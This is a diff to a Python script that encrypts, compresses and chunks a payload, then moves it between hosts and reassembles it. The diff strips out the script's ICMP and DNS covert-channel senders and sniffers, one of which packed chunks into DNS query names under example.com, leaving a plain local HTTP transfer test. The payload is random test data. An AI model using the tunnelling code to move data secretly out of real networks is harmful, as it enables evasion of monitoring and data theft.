@@ -9,7 +9,7 @@ import requests
 import ssl
 import string
 from flask import Flask, request, jsonify
-from scapy.all import IP, ICMP, UDP, TCP, DNS, DNSQR, Raw, send, sniff, get_if_list
+from scapy.all import IP, ICMP, UDP, Raw, send, sniff
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
@@ -23,34 +23,37 @@ http_server_ip = "192.168.86.132"  # Replace with your actual IP
 http_server_port = 5000
 chunk_size = 32  # You can adjust this if needed
 
+# Global variable to store the encrypted payload
+encrypted_payload = None
+
 # Generate a random string of specified length
 def generate_random_payload(length):
-    letters = string.ascii_letters + string.digits + string.punctuation
+    letters = string.ascii_letters + string.digits  # Exclude punctuation
     return ''.join(random.choice(letters) for i in range(length))
 
 # Encryption and Compression
 def encrypt_and_compress_payload(payload):
-    compressed_payload = zlib.compress(payload.encode())
-    key = hashlib.sha256(SECRET_KEY.encode()).digest()
+    compressed_payload = zlib.compress(payload.encode('utf-8'))
+    key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
     cipher = AES.new(key, AES.MODE_CBC)
     encrypted = cipher.iv + cipher.encrypt(pad(compressed_payload, AES.block_size))
     return encrypted
 
 def decrypt_and_decompress_payload(payload):
     try:
-        key = hashlib.sha256(SECRET_KEY.encode()).digest()
+        key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
         iv = payload[:16]
         cipher = AES.new(key, AES.MODE_CBC, iv)
         decrypted = unpad(cipher.decrypt(payload[16:]), AES.block_size)
         decompressed = zlib.decompress(decrypted)
-        return decompressed.decode()
+        return decompressed.decode('utf-8')
     except Exception as e:
         raise ValueError(f"Error decrypting or decompressing payload: {e}")
 
 # Split Payload
 def split_payload(payload):
     payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
-    protocols = ['icmp', 'dns', 'http', 'https']
+    protocols = ['http']  # Use only HTTP initially
     assigned_chunks = {protocol: [] for protocol in protocols}
 
     for i, chunk in enumerate(payload_chunks):
@@ -73,7 +76,7 @@ def receive_payload():
             return jsonify({"error": "Invalid payload"}), 400
 
         chunk_index = int(data['chunk_index'])
-        chunk = base64.b64decode(data['chunk'])
+        chunk = base64.b64decode(data['chunk'].encode('ascii'))
         with dict_lock:
             if chunk_index not in received_chunks:
                 received_chunks[chunk_index] = chunk
@@ -88,31 +91,11 @@ def receive_payload():
 def start_http_server():
     app.run(host=http_server_ip, port=http_server_port, debug=False, use_reloader=False)
 
-def start_https_server():
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain('cert.pem', 'key.pem')  # Ensure these files exist
-    app.run(host=http_server_ip, port=http_server_port + 1, ssl_context=context, debug=False, use_reloader=False)
-
 # Send Payload
-def send_icmp_payload(chunks, target_ip):
-    for i, chunk in chunks:
-        packet_payload = f"PAYLOAD|{i}|".encode() + chunk
-        packet = IP(dst=target_ip) / ICMP() / Raw(load=packet_payload)
-        send(packet, verbose=False)
-        print(f"[Sender - ICMP] Sent chunk index {i} with payload: {packet_payload}")
-
-def send_dns_payload(chunks):
-    for i, chunk in chunks:
-        chunk_b64 = base64.urlsafe_b64encode(chunk).decode().rstrip('=')
-        query_name = f"PAYLOAD-{i}.{chunk_b64}.example.com"
-        packet = IP(dst=dns_servers[0]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
-        send(packet, verbose=False)
-        print(f"[Sender - DNS] Sent chunk index {i} as query: {query_name}")
-
 def send_http_payload(chunks, target_ip):
     for i, chunk in chunks:
         url = f"http://{target_ip}:{http_server_port}/receive_payload"
-        chunk_b64 = base64.b64encode(chunk).decode()
+        chunk_b64 = base64.b64encode(chunk).decode('ascii')
         data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
         print(f"[Sender - HTTP] Sending POST request to {url} with data: {data}")
         try:
@@ -120,51 +103,6 @@ def send_http_payload(chunks, target_ip):
             print(f"[Sender - HTTP] Response: {response.status_code}, {response.text}")
         except Exception as e:
             print(f"[Sender - HTTP] Error sending chunk index {i}: {e}")
-
-def send_https_payload(chunks, target_ip):
-    for i, chunk in chunks:
-        url = f"https://{target_ip}:{http_server_port + 1}/receive_payload"
-        chunk_b64 = base64.b64encode(chunk).decode()
-        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
-        print(f"[Sender - HTTPS] Sending POST request to {url} with data: {data}")
-        try:
-            response = requests.post(url, json=data, verify=False)
-            print(f"[Sender - HTTPS] Response: {response.status_code}, {response.text}")
-        except Exception as e:
-            print(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")
-
-# Sniffer
-def process_packet(packet):
-    try:
-        if packet.haslayer(ICMP) and packet.haslayer(Raw):
-            payload = packet[Raw].load
-            if b"PAYLOAD|" in payload:
-                print(f"[Sniffer - ICMP] Captured payload: {payload}")
-                _, index_str, chunk = payload.split(b"|", 2)
-                chunk_index = int(index_str.decode())
-                with dict_lock:
-                    if chunk_index not in received_chunks:
-                        received_chunks[chunk_index] = chunk
-                        print(f"[Receiver - ICMP] Received chunk index {chunk_index}: {chunk}")
-                    else:
-                        print(f"[Receiver - ICMP] Duplicate chunk index {chunk_index} ignored.")
-
-        elif packet.haslayer(DNS) and packet.haslayer(DNSQR):
-            query_name = packet[DNSQR].qname.decode().strip('.')
-            if query_name.startswith("PAYLOAD-"):
-                print(f"[Sniffer - DNS] Captured DNS query: {query_name}")
-                parts = query_name.split('.')
-                chunk_index = int(parts[0].split('-')[1])
-                chunk_b64 = parts[1]
-                chunk = base64.urlsafe_b64decode(chunk_b64 + '==')
-                with dict_lock:
-                    if chunk_index not in received_chunks:
-                        received_chunks[chunk_index] = chunk
-                        print(f"[Receiver - DNS] Received chunk index {chunk_index}: {chunk}")
-                    else:
-                        print(f"[Receiver - DNS] Duplicate chunk index {chunk_index} ignored.")
-    except Exception as e:
-        print(f"[Sniffer] Error processing packet: {e}")
 
 # Reassemble Payload
 def reassemble_payload():
@@ -174,6 +112,11 @@ def reassemble_payload():
             sorted_chunks = [received_chunks[key] for key in sorted(received_chunks.keys())]
             reassembled_payload = b''.join(sorted_chunks)
             print(f"[Reassembler] Reassembled payload (bytes): {reassembled_payload}")
+            # Compare with original encrypted payload
+            if reassembled_payload == encrypted_payload:
+                print("[Reassembler] Reassembled payload matches the original encrypted payload")
+            else:
+                print("[Reassembler] Reassembled payload does NOT match the original encrypted payload")
             try:
                 decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
                 print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
@@ -192,47 +135,16 @@ if __name__ == "__main__":
     print(f"[Main] Encrypted payload size: {len(encrypted_payload)} bytes")
     assigned_chunks = split_payload(encrypted_payload)
 
-    # Debug assigned chunks
-    print(f"[Debug] Assigned ICMP Chunks: {assigned_chunks['icmp']}")
-    print(f"[Debug] Assigned DNS Chunks: {assigned_chunks['dns']}")
-    print(f"[Debug] Assigned HTTP Chunks: {assigned_chunks['http']}")
-    print(f"[Debug] Assigned HTTPS Chunks: {assigned_chunks['https']}")
-
     print("[Main] Starting HTTP server...")
     threading.Thread(target=start_http_server, daemon=True).start()
 
-    print("[Main] Starting HTTPS server...")
-    threading.Thread(target=start_https_server, daemon=True).start()
+    time.sleep(2)  # Allow server to initialize
 
-    print("[Main] Starting sniffer...")
-    interface = "Software Loopback Interface 1"  # Replace with your interface name
-    threading.Thread(
-        target=lambda: sniff(
-            iface=interface,
-            filter="icmp or udp port 53",
-            prn=process_packet,
-            stop_filter=lambda x: stop_sniffer.is_set()
-        ),
-        daemon=True
-    ).start()
-
-    time.sleep(5)  # Allow servers and threads to initialize
-
-    # Send payload over all protocols
-    print("[Main] Sending payload over ICMP...")
-    send_icmp_payload(assigned_chunks['icmp'], target_ip)
-
-    print("[Main] Sending payload over DNS...")
-    send_dns_payload(assigned_chunks['dns'])
-
+    # Send payload over HTTP
     print("[Main] Sending payload over HTTP...")
     send_http_payload(assigned_chunks['http'], http_server_ip)
 
-    print("[Main] Sending payload over HTTPS...")
-    send_https_payload(assigned_chunks['https'], http_server_ip)
-
-    time.sleep(10)  # Allow time for packets to be processed
-    stop_sniffer.set()
+    time.sleep(5)  # Allow time for packets to be processed
 
     print("[Main] Reassembling payload...")
     reassemble_payload()
